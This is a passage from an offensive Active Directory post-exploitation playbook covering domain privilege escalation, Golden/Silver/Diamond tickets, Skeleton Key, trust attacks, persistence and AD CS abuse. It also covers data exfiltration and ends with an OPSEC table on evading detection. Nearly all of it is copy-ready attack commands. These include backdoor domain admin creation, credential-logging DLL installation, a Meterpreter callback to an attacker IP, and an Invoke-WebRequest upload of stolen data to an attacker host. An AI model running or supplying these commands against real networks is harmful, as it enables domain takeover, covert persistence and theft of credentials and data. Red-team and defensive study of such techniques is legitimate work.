download C:\temp\system
# secretsdump.py -ntds ntds.dit -system system LOCAL
```

## 9.3 LAPS Abuse

```
# Read LAPS passwords (requires read rights)
powershell -c "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime | Select Name,ms-Mcs-AdmPwd"

# Using PowerView
Get-DomainComputer -ComputerName <target> -Properties ms-Mcs-AdmPwd

# Metasploit
run post/windows/gather/credentials/enum_laps
```

## 9.4 GPO Abuse

```
# If you have write rights to a GPO linked to target OUs

# Add immediate scheduled task
# Creates scheduled task via GPO that runs as SYSTEM

# Using SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c <payload>" --GPOName "VulnerableGPO"

# Force GPO update on target
gpupdate /force
```

## 9.5 Print Spooler Abuse (PrintNightmare)

```
# Check if spooler is running
shell
sc query spooler
Get-Service Spooler

# CVE-2021-1675 / CVE-2021-34527
# Metasploit
use exploit/windows/dcerpc/printnightmare
set RHOSTS <dc_ip>
set SMBUSER <user>
set SMBPASS <pass>
run

# Create malicious DLL and host on share
# Trigger via RPC
```

## 9.6 DNS Admin Abuse

```
# If member of DnsAdmins group
# Create malicious DLL

# Set ServerLevelPluginDll
dnscmd <dc> /config /serverlevelplugindll \\<attacker>\share\evil.dll

# Restart DNS (or wait)
sc \\<dc> stop dns
sc \\<dc> start dns

# DLL executes as SYSTEM on DC
```

## 9.7 Exchange Abuse

```
# If member of Exchange groups (Organization Management, Exchange Windows Permissions)
# WriteDACL on domain object

# Grant DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -PrincipalIdentity <user> -Rights DCSync

# Then DCSync
```

## 9.8 Shadow Credentials Attack

```
# If GenericWrite on user/computer
# Add to msDS-KeyCredentialLink attribute

# Using Whisker
Whisker.exe add /target:<target>

# Using pywhisker (remote)
# python3 pywhisker.py -d <domain> -u <user> -p <pass> --target <target> --action add

# Then authenticate with certificate
Rubeus.exe asktgt /user:<target> /certificate:<pfx> /password:<cert_pass> /ptt
```

---

# Phase 10: Domain Dominance

## 10.1 Golden Ticket

```
# Requires: KRBTGT NTLM hash + Domain SID

# Get KRBTGT hash (DCSync)
load kiwi
dcsync_ntlm <domain>\krbtgt

# Get Domain SID
shell
whoami /user
# S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX

# Create Golden Ticket
golden_ticket_create -d <domain> -u Administrator -s <domain_sid> -k <krbtgt_ntlm> -t /tmp/golden.kirbi

# Or using Mimikatz
kiwi_cmd "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<hash> /ptt"

# Inject and use
kerberos_ticket_use /tmp/golden.kirbi

# Access any resource
shell
dir \\<dc>\c$
```

## 10.2 Silver Ticket

```
# Requires: Service account NTLM hash

# Create Silver Ticket for CIFS (file access)
kiwi_cmd "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<server> /service:cifs /rc4:<service_hash> /ptt"

# For LDAP (DCSync without DC hash)
kiwi_cmd "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /target:<dc> /service:ldap /rc4:<dc_hash> /ptt"

# Common services
# cifs - File shares
# ldap - LDAP operations, DCSync
# http - Web services
# mssql - SQL Server
# host - PsExec, scheduled tasks
```

## 10.3 Diamond Ticket

```
# Modified TGT that bypasses some detections
# Uses real PAC but modifies it

# Rubeus
Rubeus.exe diamond /krbkey:<krbtgt_aes256> /user:<user> /password:<pass> /enctype:aes /domain:<domain> /dc:<dc> /ptt
```

## 10.4 Skeleton Key

```
# Inject into DC LSASS - allows any password
# VERY NOISY - persists until reboot

# On DC
load kiwi
kiwi_cmd "misc::skeleton"

# Default skeleton password: mimikatz

# Now authenticate as any user with password "mimikatz"
```

## 10.5 DCShadow

```
# Push changes to AD without logging
# Requires Domain Admin (or equivalent)

# Start RPC server
kiwi_cmd "lsadump::dcshadow /object:<target_user> /attribute:servicePrincipalName /value:fake/spn"

# Push changes (in another session)
kiwi_cmd "lsadump::dcshadow /push"
```

## 10.6 AdminSDHolder Modification

```
# Modify AdminSDHolder permissions
# Propagates to all protected groups every 60 mins

# Add yourself to AdminSDHolder ACL
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=com" -PrincipalIdentity <your_user> -Rights All

# Wait 60 mins or trigger
# Now have rights on all protected groups/users
```

## 10.7 DSRM Credentials

```
# Directory Services Restore Mode - local admin on DC
# Works even if domain admin password changed

# Get DSRM hash (on DC)
kiwi_cmd "lsadump::lsa /patch"
# Look for Administrator hash under "DSRM"

# Enable DSRM logon
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DSRMAdminLogonBehavior /t REG_DWORD /d 2

# Now can PtH with DSRM admin hash to DC
```

---

# Phase 11: Cross-Forest & Trust Attacks

## 11.1 Trust Enumeration

```
# Enumerate trusts
nltest /domain_trusts /all_trusts
nltest /trusted_domains

# PowerShell
Get-ADTrust -Filter *
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()

# Trust properties
Get-ADTrust -Filter * | Select Name,Direction,TrustType,TrustAttributes
```

## 11.2 Child-to-Parent (Same Forest)

```
# Get Enterprise Admin SID from parent domain
# S-1-5-21-<parent_domain>-519

# Get trust key (inter-realm key)
load kiwi
dcsync_ntlm <child_domain>\<parent_domain>$

# Or get krbtgt hash
dcsync_ntlm <child_domain>\krbtgt

# Create inter-realm TGT with SIDHistory to Enterprise Admins
kiwi_cmd "kerberos::golden /user:Administrator /domain:<child_domain> /sid:<child_sid> /sids:S-1-5-21-<parent_sid>-519 /krbtgt:<krbtgt_hash> /ptt"

# Access parent domain
dir \\<parent_dc>\c$
```

## 11.3 External Trust (One-Way Outbound)

```
# If external trust exists and you're in trusted domain
# Enumerate what groups from trusted domain have access

# Find foreign security principals
Get-ADObject -Filter {objectClass -eq "foreignSecurityPrincipal"} -Properties *

# Check SID mapping
# If trusted users/groups have admin access, impersonate them
```

## 11.4 SID History Injection

```
# Add Enterprise Admin SID to user's SIDHistory
# Allows cross-domain privilege escalation

# Using Mimikatz (requires domain admin)
kiwi_cmd "misc::addsid <user> S-1-5-21-<target_domain>-519"

# Using DSInternals
Stop-Service ntds -Force
Add-ADDBSidHistory -SamAccountName <user> -SidHistory S-1-5-21-<target_domain>-512 -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service ntds
```

## 11.5 PAM Trust Abuse

```
# Privileged Access Management trusts
# Shadow principals in bastion forest

# Enumerate PAM trust
Get-ADTrust -Filter {TrustAttributes -eq "1096"}

# If shadow principal exists for your user
# Check membership in admin groups
```

---

# Phase 12: Persistence Mechanisms

## 12.1 Domain Persistence

### New Domain Admin Account
```
# Create new domain admin
net user hacker Password123! /add /domain
net group "Domain Admins" hacker /add /domain
```

### Add to High-Value Groups
```
net group "Enterprise Admins" hacker /add /domain
net group "Schema Admins" hacker /add /domain
net group "Account Operators" hacker /add /domain
net group "Backup Operators" hacker /add /domain
```

### DCSync Rights Grant
```
# Grant replication rights
# PowerShell
$user = Get-ADUser hacker
$domain = "DC=domain,DC=com"
$acl = Get-Acl "AD:\$domain"

# DS-Replication-Get-Changes
$ace1 = New-Object DirectoryServices.ActiveDirectoryAccessRule($user.SID,"ExtendedRight","Allow",[GUID]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
# DS-Replication-Get-Changes-All
$ace2 = New-Object DirectoryServices.ActiveDirectoryAccessRule($user.SID,"ExtendedRight","Allow",[GUID]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")

$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl "AD:\$domain" $acl
```

### Golden/Silver Tickets
```
# Already covered - create and store for future access
```

## 12.2 Machine Persistence

### Registry Run Keys
```
# Meterpreter
run persistence -U -i 60 -p 443 -r <attacker_ip>

# Manual
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\temp\payload.exe"
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\temp\payload.exe"
```

### Scheduled Tasks
```
# Create scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\temp\payload.exe" /sc onstart /ru system

# XML-based for more options
schtasks /create /tn "Task" /xml task.xml

# Meterpreter
run post/windows/manage/persistence_exe
```

### Services
```
# Create service
sc create <name> binpath= "C:\temp\payload.exe" start= auto
sc start <name>

# Modify existing service
sc config <existing_service> binpath= "C:\temp\payload.exe"
```

### WMI Event Subscriptions
```
# PowerShell WMI persistence
$filterArgs = @{
    EventNamespace = 'root\CIMv2'
    Name = 'MyFilter'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = 'MyConsumer'
    CommandLineTemplate = 'C:\temp\payload.exe'
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs

# Meterpreter
run post/windows/manage/wmi_persistence
```

### DLL Hijacking
```
# Find writable DLL paths
# Common locations:
# C:\Windows\System32\
# Application directories
# Current directory (for specific apps)

# Create malicious DLL with same exports
```

### COM Hijacking
```
# Registry-based COM hijacking
reg add "HKCU\Software\Classes\CLSID\{<CLSID>}\InprocServer32" /ve /t REG_SZ /d "C:\temp\evil.dll"
reg add "HKCU\Software\Classes\CLSID\{<CLSID>}\InprocServer32" /v ThreadingModel /t REG_SZ /d "Both"
```

### Startup Folder
```
# Current user
copy payload.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users (requires admin)
copy payload.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

## 12.3 Stealthy Persistence

### Custom SSP (Credential Logger)
```
# Create DLL that logs passwords
# Copy to C:\Windows\System32\

reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0memssp"
```

### AppInit_DLLs
```
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\temp\evil.dll"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1
```

### Print Monitor
```
# Copy DLL to System32
copy evil.dll C:\Windows\System32\

# Register as monitor
reg add "HKLM\System\CurrentControlSet\Control\Print\Monitors\MyMonitor" /v Driver /t REG_SZ /d "evil.dll"
```

---

# Phase 13: Certificate Services (AD CS) Attacks

## 13.1 Enumerate AD CS

```
# Find CA servers
certutil -config - -ping

# Enumerate templates
certutil -v -template

# PowerShell
Get-ADObject -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" -Filter * -Properties *

# Certify.exe
Certify.exe find
Certify.exe find /vulnerable
```

## 13.2 ESC1 - Misconfigured Template (Client Auth + SAN)

```
# Template allows:
# - Client Authentication EKU
# - ENROLLEE_SUPPLIES_SUBJECT flag
# - Low-privileged enrollment

# Request certificate for Domain Admin
Certify.exe request /ca:<CA> /template:<template> /altname:Administrator

# Convert to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Authenticate
Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /ptt
```

## 13.3 ESC2 - Any Purpose EKU

```
# Template with "Any Purpose" or no EKU
# Can be used for client auth

Certify.exe request /ca:<CA> /template:<template>
Rubeus.exe asktgt /user:<user> /certificate:cert.pfx /ptt
```

## 13.4 ESC3 - Certificate Agent

```
# Enroll as certificate agent
# Then request cert on behalf of others

Certify.exe request /ca:<CA> /template:CertificateRequestAgent
# Use agent cert to request on behalf of admin
Certify.exe request /ca:<CA> /template:User /onbehalfof:DOMAIN\Administrator /enrollcert:<agent_cert>
```

## 13.5 ESC4 - Vulnerable Template ACL

```
# Write access to template = modify it for ESC1
# Add ENROLLEE_SUPPLIES_SUBJECT flag

# Modify template (requires write)
# Then exploit as ESC1
```

## 13.6 ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

```
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag
# Allows SAN in any request

certutil -config "<CA>" -getreg "policy\EditFlags"

# If enabled, request with SAN
Certify.exe request /ca:<CA> /template:User /altname:Administrator
```

## 13.7 ESC7 - CA Manager Rights

```
# If you have ManageCA rights
# Enable ESC6 flag

# Enable vulnerable flag
certutil -config "<CA>" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc

# Then exploit ESC6
```

## 13.8 ESC8 - NTLM Relay to HTTP Enrollment

```
# Web enrollment endpoint accepts NTLM
# Relay authentication to request certificate

# Start relay
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce authentication (PrinterBug, PetitPotam)
# Get certificate for DC
```

## 13.9 Persistence via Certificates

```
# Request long-lived certificate
# Certificates valid even if password changed

Certify.exe request /ca:<CA> /template:User

# Store certificate
# Use for authentication anytime
Rubeus.exe asktgt /user:<user> /certificate:cert.pfx /ptt
```

---

# Phase 14: Data Exfiltration & Objectives

## 14.1 Sensitive Data Discovery

### File Type Searches
```
# Meterpreter search
search -f *password*
search -f *credential*
search -f *secret*
search -f *confidential*
search -f *sensitive*
search -f *private*

# Key/Certificate files
search -f *.key
search -f *.pem
search -f *.pfx
search -f *.p12
search -f *.ppk
search -f id_rsa
search -f id_dsa

# Database files
search -f *.sql
search -f *.mdf
search -f *.ldf
search -f *.bak
search -f *.sqlite
search -f *.db

# Password managers
search -f *.kdbx
search -f *.kdb
search -f *.1pif

# Configuration files
search -f *.config
search -f web.config
search -f app.config
search -f *.xml
search -f *.ini
search -f *.conf
search -f *.json
search -f *.yaml
search -f *.yml
search -f .env

# Office documents
search -f *.docx
search -f *.xlsx
search -f *.pptx
search -f *.doc
search -f *.xls
search -f *.pdf

# Source code
search -f *.cs
search -f *.java
search -f *.py
search -f *.ps1
search -f *.sh
```

### Content Searches
```
# Search within files
shell
findstr /si password *.txt *.xml *.config *.ini
findstr /si "connectionstring" *.config
findstr /si "api.key\|apikey\|api_key" *.*
findstr /si "secret\|token" *.json *.xml *.config

# PowerShell content search
Get-ChildItem -Recurse -Include *.txt,*.config,*.xml | Select-String -Pattern "password" -SimpleMatch
```

## 14.2 Email Access

```
# Exchange enumeration
run post/windows/gather/exchange_enum

# Find PST/OST files
search -f *.pst
search -f *.ost

# Exchange Web Services
# If credentials obtained, access OWA
# Download mailbox via EWS
```

## 14.3 Database Access

```
# Find database files
search -f *.mdf
search -f *.ldf
search -f *.sql

# SQL Server enumeration
run post/windows/gather/enum_db

# If SQL access
# Use auxiliary/admin/mssql/mssql_sql
use auxiliary/admin/mssql/mssql_sql
set RHOSTS <db_server>
set USERNAME sa
set PASSWORD <password>
set SQL "SELECT name FROM sys.databases"
run

# Enable xp_cmdshell
set SQL "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
run

# Execute commands
set SQL "EXEC xp_cmdshell 'whoami'"
run
```

## 14.4 File Server / Share Access

```
# Enumerate all accessible shares
run post/windows/gather/enum_shares

# Mount and explore
net use Z: \\<server>\<share>
dir /s /b Z:\

# Common sensitive shares
dir \\<server>\IT$
dir \\<server>\Finance$
dir \\<server>\HR$
dir \\<server>\Backup$
dir \\<server>\Software$
```

## 14.5 Cloud Credentials

```
# AWS credentials
search -f credentials
search -f .aws
type C:\Users\<user>\.aws\credentials

# Azure credentials
search -f .azure
search -f azureProfile.json
type C:\Users\<user>\.azure\accessTokens.json

# GCP credentials
search -f application_default_credentials.json
search -f *.json | findstr /i gcp
```

## 14.6 Browser Data

```
# Chrome
run post/windows/gather/enum_chrome

# Firefox
run post/multi/gather/firefox_creds

# Edge/IE
run post/windows/gather/enum_ie

# Browser history
# Chrome: %LOCALAPPDATA%\Google\Chrome\User Data\Default\History
# Firefox: %APPDATA%\Mozilla\Firefox\Profiles\<profile>\places.sqlite
```

## 14.7 Data Exfiltration Methods

```
# Direct download
download <file>
download -r <directory>

# Compress first
shell
powershell Compress-Archive -Path C:\data -DestinationPath C:\temp\data.zip

# Base64 encode (for small files)
certutil -encode <file> encoded.txt

# Split large files
split -b 50M large_file.zip part_

# DNS exfiltration (for restricted networks)
# Encode data in DNS queries

# HTTP/HTTPS POST
powershell -c "Invoke-WebRequest -Uri http://<attacker>/upload -Method POST -InFile C:\temp\data.zip"
```

---

# Quick Reference: Metasploit AD Modules

## Enumeration
```
post/windows/gather/enum_domain
post/windows/gather/enum_domain_group_users
post/windows/gather/enum_domain_users
post/windows/gather/enum_ad_computers
post/windows/gather/enum_ad_users
post/windows/gather/enum_ad_groups
post/windows/gather/enum_ad_service_principal_names
post/windows/gather/enum_shares
post/windows/gather/enum_logged_on_users
post/windows/gather/arp_scanner
post/windows/gather/enum_applications
post/windows/gather/enum_services
```

## Credential Gathering
```
post/windows/gather/smart_hashdump
post/windows/gather/hashdump
post/windows/gather/cachedump
post/windows/gather/lsa_secrets
post/windows/gather/credentials/gpp
post/windows/gather/credentials/credential_collector
post/windows/gather/credentials/windows_autologin
post/windows/gather/credentials/enum_laps
post/windows/gather/ntds_grabber
post/windows/gather/enum_unattend
post/multi/gather/firefox_creds
post/windows/gather/enum_chrome
```

## Lateral Movement
```
exploit/windows/smb/psexec
exploit/windows/smb/psexec_psh
exploit/windows/winrm/winrm_script_exec
exploit/windows/local/wmi
auxiliary/admin/smb/psexec_command
```

## Kerberos Attacks
```
auxiliary/gather/kerberos_enumusers
auxiliary/gather/get_user_spns
auxiliary/gather/asrep_roast
```

## Privilege Escalation
```
post/multi/recon/local_exploit_suggester
exploit/windows/local/bypassuac_eventvwr
exploit/windows/local/ms16_032_secondary_logon_handle_privesc
exploit/windows/local/cve_2020_0796_smbghost
```

---

# Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        INITIAL ACCESS                                    │
│                    [Meterpreter Shell]                                   │
└─────────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 1: SITUATIONAL AWARENESS                                          │
│ • sysinfo, getuid, getprivs                                             │
│ • Network config, ARP, routes                                           │
│ • Domain discovery, DC enumeration                                      │
│ • AV/EDR detection                                                      │
└─────────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 2: CREDENTIAL HARVESTING                                          │
│ • Mimikatz/Kiwi - creds_all, hashdump                                   │
│ • Token impersonation                                                   │
│ • DPAPI, cached credentials                                             │
│ • Config files, GPP passwords                                           │
└─────────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 3-5: AD ENUMERATION                                               │
│ • Users, Groups, Computers                                              │
│ • SPNs, ACLs, Delegation                                                │
│ • SMB shares - spider for secrets                                       │
│ • BloodHound - attack path analysis                                     │
└─────────────────────────────────────────────────────────────────────────┘
                                │
                    ┌───────────┴───────────┐
                    ▼                       ▼
    ┌───────────────────────┐   ┌───────────────────────┐
    │ PHASE 6: ACL ABUSE    │   │ PHASE 7: KERBEROS     │
    │ • GenericAll          │   │ • Kerberoasting       │
    │ • WriteDACL           │   │ • AS-REP Roasting     │
    │ • WriteOwner          │   │ • Delegation abuse    │
    │ • ForceChangePassword │   │ • Pass-the-Ticket     │
    └───────────────────────┘   └───────────────────────┘
                    │                       │
                    └───────────┬───────────┘
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 8: LATERAL MOVEMENT                                               │
│ • Pass-the-Hash (PSExec)                                                │
│ • WMI, WinRM, DCOM                                                      │
│ • SMB, RDP, Scheduled Tasks                                             │
└─────────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 9: DOMAIN PRIVILEGE ESCALATION                                    │
│ • DCSync                                                                │
│ • NTDS.dit extraction                                                   │
│ • LAPS, GPO, DNS Admin abuse                                            │
│ • AD CS attacks (ESC1-8)                                                │
└─────────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 10: DOMAIN DOMINANCE                                              │
│ • Golden Ticket                                                         │
│ • Silver Ticket                                                         │
│ • Skeleton Key                                                          │
│ • DCShadow                                                              │
└─────────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 11-12: TRUSTS & PERSISTENCE                                       │
│ • Cross-forest attacks                                                  │
│ • SID History injection                                                 │
│ • Domain & machine persistence                                          │
│ • Certificate persistence                                               │
└─────────────────────────────────────────────────────────────────────────┘
                                │
                                ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ PHASE 14: OBJECTIVES                                                    │
│ • Sensitive data discovery                                              │
│ • Database access                                                       │
│ • Email access                                                          │
│ • Data exfiltration                                                     │
└─────────────────────────────────────────────────────────────────────────┘
```

---

# OPSEC Considerations

| Technique | Noise Level | Detection Risk | Notes |
|-----------|------------|----------------|-------|
| DCSync | HIGH | EDR, SIEM | Creates replication traffic |
| Golden Ticket | MEDIUM | Event 4769 anomalies | 10-year tickets suspicious |
| Kerberoasting | LOW | Many TGS requests | Can be stealthy |
| AS-REP Roasting | LOW | Needs pre-auth disabled | Limited targets |
| Pass-the-Hash | MEDIUM | Event 4624 Type 3 | Network logons |
| Mimikatz | HIGH | EDR signatures | Use alternatives |
| BloodHound | MEDIUM | LDAP queries | Large query volume |
| Skeleton Key | VERY HIGH | DC LSASS modification | Persists until reboot |
| NTDS.dit | HIGH | Volume shadow copy | Creates VSS snapshot |

---

# References

- [HackTricks - Active Directory Methodology](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/)
- [The Hacker Recipes](https://www.thehacker.recipes/)
- [PayloadsAllTheThings - AD](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
- [ired.team - AD Attacks](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)
- [SpecterOps BloodHound](https://bloodhound.specterops.io/)
- [AD Security](https://adsecurity.org/)
- [Harmj0y's Blog](https://blog.harmj0y.net/)
- [Metasploit Documentation](https://docs.metasploit.com/)
